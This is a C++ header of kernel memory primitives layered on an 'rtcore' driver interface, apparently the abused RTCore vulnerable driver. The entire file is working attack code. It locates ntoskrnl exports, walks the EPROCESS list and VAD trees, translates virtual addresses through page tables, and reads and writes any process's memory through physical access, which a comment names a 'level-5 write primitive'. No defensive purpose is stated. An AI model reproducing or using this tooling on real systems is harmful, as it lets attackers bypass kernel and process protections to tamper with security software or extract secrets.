// kmem.h — kernel memory primitives on top of rtcore
// - EPROCESS walk by PID
// - VAD tree walk (iterative in-order)
// - target VA -> physical translation via page-table walk
// - target-virt read/write via physical mapping (level-5 write primitive)
#pragma once
#include "offsets.h"
#include "rtcore.h"
#include <winternl.h>
#include <cstdint>
#include <cstring>
#include <cstdio>
#include <string>
#include <vector>
#include <stack>
#include <algorithm>

namespace km {

// ----------------------------------------- NtQuerySystemInformation module 0
// returns ntoskrnl base + canonical on-disk path
struct ModInfoRow {
    HANDLE Section;
    PVOID  MappedBase;
    PVOID  ImageBase;
    ULONG  ImageSize;
    ULONG  Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR  FullPathName[256];
};
struct ModInfoBlock {
    ULONG NumberOfModules;
    ModInfoRow Modules[1];
};

inline bool get_ntoskrnl_info(std::uint64_t& base_va, std::wstring& disk_path) {
    using pfnNQSI = NTSTATUS (NTAPI*)(ULONG, PVOID, ULONG, PULONG);
    HMODULE nt = ::GetModuleHandleW(L"ntdll.dll");
    if (!nt) return false;
    auto f = reinterpret_cast<pfnNQSI>(::GetProcAddress(nt, "NtQuerySystemInformation"));
    if (!f) return false;

    ULONG need = 0;
    f(11 /* SystemModuleInformation */, nullptr, 0, &need);
    if (need == 0) return false;
    std::vector<unsigned char> buf(need + 0x1000);
    ULONG got = 0;
    if (f(11, buf.data(), static_cast<ULONG>(buf.size()), &got) < 0) return false;
    auto* b = reinterpret_cast<ModInfoBlock*>(buf.data());
    if (b->NumberOfModules == 0) return false;

    // find the module whose basename (filename only) is "ntoskrnl.exe".
    // on modern Windows the first module is typically ntoskrnl, but we don't rely on it.
    const ModInfoRow* found = nullptr;
    for (ULONG i = 0; i < b->NumberOfModules; ++i) {
        const auto& m = b->Modules[i];
        const char* name = reinterpret_cast<const char*>(m.FullPathName) + m.OffsetToFileName;
        if (_stricmp(name, "ntoskrnl.exe") == 0) { found = &m; break; }
    }
    if (!found) found = &b->Modules[0]; // fallback
    base_va = reinterpret_cast<std::uint64_t>(found->ImageBase);
    std::fprintf(stderr, "[dbg] ntoskrnl pick: '%s' base=0x%016llx\n",
                 reinterpret_cast<const char*>(found->FullPathName) + found->OffsetToFileName,
                 (unsigned long long)base_va);

    // canonical disk path
    wchar_t sysdir[MAX_PATH]{};
    ::GetSystemDirectoryW(sysdir, MAX_PATH);
    disk_path = std::wstring(sysdir) + L"\\ntoskrnl.exe";
    return true;
}

// -------------------------------------- export RVA lookup in an on-disk PE
inline bool find_export_rva(const wchar_t* path, const char* sym, ULONG& out_rva) {
    HANDLE fh = ::CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
                              OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (fh == INVALID_HANDLE_VALUE) return false;
    HANDLE mh = ::CreateFileMappingW(fh, nullptr, PAGE_READONLY, 0, 0, nullptr);
    ::CloseHandle(fh);
    if (!mh) return false;
    auto* base = static_cast<unsigned char*>(::MapViewOfFile(mh, FILE_MAP_READ, 0, 0, 0));
    ::CloseHandle(mh);
    if (!base) return false;
    struct G { unsigned char* p; ~G(){ if(p) ::UnmapViewOfFile(p); } } g{base};

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    auto rva2off = [&](ULONG rva) -> unsigned char* {
        auto* sec = IMAGE_FIRST_SECTION(nt);
        for (unsigned i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
            if (rva >= sec->VirtualAddress &&
                rva <  sec->VirtualAddress + sec->Misc.VirtualSize) {
                return base + sec->PointerToRawData + (rva - sec->VirtualAddress);
            }
        }
        return nullptr;
    };
    const auto& edd = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (edd.Size == 0) return false;
    auto* exp = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(rva2off(edd.VirtualAddress));
    if (!exp) return false;
    auto* names = reinterpret_cast<ULONG*>(rva2off(exp->AddressOfNames));
    auto* ords  = reinterpret_cast<USHORT*>(rva2off(exp->AddressOfNameOrdinals));
    auto* funcs = reinterpret_cast<ULONG*>(rva2off(exp->AddressOfFunctions));
    if (!names || !ords || !funcs) return false;
    for (ULONG i = 0; i < exp->NumberOfNames; ++i) {
        auto* nm = reinterpret_cast<const char*>(rva2off(names[i]));
        if (nm && std::strcmp(nm, sym) == 0) {
            out_rva = funcs[ords[i]];
            return true;
        }
    }
    return false;
}

// ----------------------------------------------- find EPROCESS by PID
inline bool find_eprocess(rt::Driver& d, std::uint64_t sys_eproc,
                          std::uint64_t target_pid, std::uint64_t& out_eproc)
{
    const std::uint64_t head = sys_eproc + ko::EP_ActiveProcessLinks;
    std::uint64_t cur = 0;
    if (!d.kv_u64(head, cur)) return false;
    for (int i = 0; i < 8192; ++i) {
        std::uint64_t eproc = cur - ko::EP_ActiveProcessLinks;
        std::uint64_t pid = 0;
        if (!d.kv_u64(eproc + ko::EP_UniqueProcessId, pid)) return false;
        if (pid == target_pid) { out_eproc = eproc; return true; }
        std::uint64_t next = 0;
        if (!d.kv_u64(cur, next)) return false;
        if (next == head) break;
        cur = next;
    }
    return false;
}

// ----------------------------------------------- VAD row + walk
struct VadRow {
    std::uint64_t start;
    std::uint64_t end;
    std::uint32_t protection;   // 5-bit MM_PROTECTION
    std::uint32_t type;         // VadType
    std::string   file;         // basename only, lowercased
    std::string   fullpath;
};

inline std::string lc_base(const std::string& p) {
    std::size_t s = p.find_last_of("\\/");
    std::string r = (s == std::string::npos) ? p : p.substr(s + 1);
    for (auto& c : r) c = static_cast<char>(::tolower(static_cast<unsigned char>(c)));
    return r;
}

inline bool read_file_of_vad(rt::Driver& d, std::uint64_t vad, std::string& out) {
    out.clear();
    std::uint64_t subs = 0;
    if (!d.kv_u64(vad + ko::VAD_Subsection, subs)) return false;
    if (!ko::is_kva(subs)) return true;
    std::uint64_t ca = 0;
    if (!d.kv_u64(subs + ko::SS_ControlArea, ca)) return false;
    if (!ko::is_kva(ca)) return true;
    std::uint64_t fp_raw = 0;
    if (!d.kv_u64(ca + ko::CA_FilePointer, fp_raw)) return false;
    std::uint64_t fp = fp_raw & ~0xFULL;
    if (!ko::is_kva(fp)) return true;
    // UNICODE_STRING { USHORT Len, USHORT Max, PWCH Buf }
    std::uint64_t us = fp + ko::FO_FileName;
    std::uint16_t len = 0; std::uint64_t buf = 0;
    if (!d.kv_u16(us + 0, len)) return false;
    if (!d.kv_u64(us + 8, buf)) return false;
    if (len == 0 || !ko::is_kva(buf)) return true;
    ULONG take = (len > 2048) ? 2048 : len;
    std::vector<wchar_t> w(take / 2 + 1, L'\0');
    if (!d.kv_read(buf, w.data(), take)) return false;
    w[take / 2] = L'\0';
    int n = ::WideCharToMultiByte(CP_UTF8, 0, w.data(), -1, nullptr, 0, nullptr, nullptr);
    if (n <= 1) return true;
    out.resize(static_cast<std::size_t>(n - 1));
    ::WideCharToMultiByte(CP_UTF8, 0, w.data(), -1, out.data(), n, nullptr, nullptr);
    return true;
}

inline bool walk_vads(rt::Driver& d, std::uint64_t eproc, std::vector<VadRow>& rows) {
    std::uint64_t root = 0;
    if (!d.kv_u64(eproc + ko::EP_VadRoot, root)) return false;
    if (root == 0) return true;
    std::stack<std::uint64_t> st;
    std::uint64_t node = root;
    int guard = 0;
    while (node || !st.empty()) {
        while (node) {
            if (++guard > 500000) return true;
            st.push(node);
            std::uint64_t left = 0;
            if (!d.kv_u64(node + ko::VS_Left, left)) return false;
            node = left;
        }
        node = st.top(); st.pop();

        std::uint32_t svpn = 0, evpn = 0, flags = 0;
        std::uint8_t svpnh = 0, evpnh = 0;
        if (!d.kv_u32(node + ko::VS_StartingVpn,  svpn))  return false;
        if (!d.kv_u32(node + ko::VS_EndingVpn,    evpn))  return false;
        d.kv_u8 (node + ko::VS_StartingVpnH, svpnh);
        d.kv_u8 (node + ko::VS_EndingVpnH,   evpnh);
        d.kv_u32(node + ko::VS_u_VadFlags,   flags);

        VadRow r{};
        r.start = ((std::uint64_t)svpnh << 32 | svpn) * 0x1000ULL;
        r.end   = (((std::uint64_t)evpnh << 32 | evpn) + 1ULL) * 0x1000ULL;
        r.type       =  flags       & 0x7u;
        r.protection = (flags >> 3) & 0x1Fu;
        std::string full;
        if (read_file_of_vad(d, node, full)) {
            r.fullpath = full;
            r.file     = lc_base(full);
        }
        rows.push_back(std::move(r));

        std::uint64_t right = 0;
        if (!d.kv_u64(node + ko::VS_Right, right)) return false;
        node = right;
    }
    std::sort(rows.begin(), rows.end(),
              [](const VadRow& a, const VadRow& b){ return a.start < b.start; });
    return true;
}

// ----------------------------------------------- va -> phys page walk
// cr3_phys = target process DirectoryTableBase, physical address of PML4.
// uses rt::Driver::phys_read to walk PML4->PDPT->PD->PT->Page.
// returns physical address of the byte at `va` in target, or 0 on failure.
inline std::uint64_t translate(rt::Driver& d, std::uint64_t cr3_phys, std::uint64_t va)
{
    std::uint64_t pml4e_i = (va >> 39) & 0x1FF;
    std::uint64_t pdpte_i = (va >> 30) & 0x1FF;
    std::uint64_t pde_i   = (va >> 21) & 0x1FF;
    std::uint64_t pte_i   = (va >> 12) & 0x1FF;
    std::uint64_t page_off = va & 0xFFF;

    auto read_entry = [&](std::uint64_t table_phys, std::uint64_t idx,
                          std::uint64_t& ent) -> bool {
        return d.phys_read(table_phys + idx * 8, &ent, 8);
    };

    std::uint64_t pml4_base = cr3_phys & ~0xFFFULL;
    std::uint64_t pml4e = 0;
    if (!read_entry(pml4_base, pml4e_i, pml4e)) return 0;
    if (!(pml4e & 1)) return 0;

    std::uint64_t pdpt_base = pml4e & 0x000FFFFFFFFFF000ULL;
    std::uint64_t pdpte = 0;
    if (!read_entry(pdpt_base, pdpte_i, pdpte)) return 0;
    if (!(pdpte & 1)) return 0;
    if (pdpte & (1ULL << 7)) {
        // 1 GiB page
        std::uint64_t base = pdpte & 0x000FFFFFC0000000ULL;
        return base + (va & 0x3FFFFFFFULL);
    }

    std::uint64_t pd_base = pdpte & 0x000FFFFFFFFFF000ULL;
    std::uint64_t pde = 0;
    if (!read_entry(pd_base, pde_i, pde)) return 0;
    if (!(pde & 1)) return 0;
    if (pde & (1ULL << 7)) {
        // 2 MiB page
        std::uint64_t base = pde & 0x000FFFFFFFE00000ULL;
        return base + (va & 0x1FFFFFULL);
    }

    std::uint64_t pt_base = pde & 0x000FFFFFFFFFF000ULL;
    std::uint64_t pte = 0;
    if (!read_entry(pt_base, pte_i, pte)) return 0;
    if (!(pte & 1)) return 0;

    std::uint64_t page = pte & 0x000FFFFFFFFFF000ULL;
    return page + page_off;
}

// ----------------------------------------------- target-virt write via phys
inline bool write_target_virt(rt::Driver& d, std::uint64_t cr3_phys,
                              std::uint64_t target_va, const void* in,
                              std::size_t n)
{
    const auto* p = static_cast<const unsigned char*>(in);
    std::size_t left = n;
    while (left) {
        std::uint64_t page_off = target_va & 0xFFF;
        std::size_t  take     = (0x1000 - page_off < left) ? (0x1000 - page_off) : left;
        std::uint64_t phys    = translate(d, cr3_phys, target_va);
        if (phys == 0) return false;
        if (!d.phys_write(phys, p, take)) return false;
        p         += take;
        target_va += take;
        left      -= take;
    }
    return true;
}

inline bool read_target_virt(rt::Driver& d, std::uint64_t cr3_phys,
                             std::uint64_t target_va, void* out, std::size_t n)
{
    auto* p = static_cast<unsigned char*>(out);
    std::size_t left = n;
    while (left) {
        std::uint64_t page_off = target_va & 0xFFF;
        std::size_t  take     = (0x1000 - page_off < left) ? (0x1000 - page_off) : left;
        std::uint64_t phys    = translate(d, cr3_phys, target_va);
        if (phys == 0) return false;
        if (!d.phys_read(phys, p, take)) return false;
        p         += take;
        target_va += take;
        left      -= take;
    }
    return true;
}

} // namespace km
